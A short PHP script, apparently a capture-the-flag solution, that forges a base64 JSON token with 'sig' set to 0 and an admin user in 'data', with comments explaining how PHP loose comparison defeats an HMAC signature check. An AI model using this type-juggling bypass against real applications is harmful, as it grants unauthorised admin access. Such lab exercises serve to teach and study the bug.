<?php

$secret = "fgjdifgjd";
$user = ["admin", true];

$data = json_encode($user);
// $sig = hash_hmac('sha512', $data, $secret);
// hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig']
// Notice that we can control sig, so we can use php weak type to  make it equal to hash_hmac('sha512', $unserialized['data'], $secret)
//, which is some string
$all = base64_encode(json_encode(['sig' => 0, 'data' => $data]));
var_dump($all);
//FLAG{???}
?>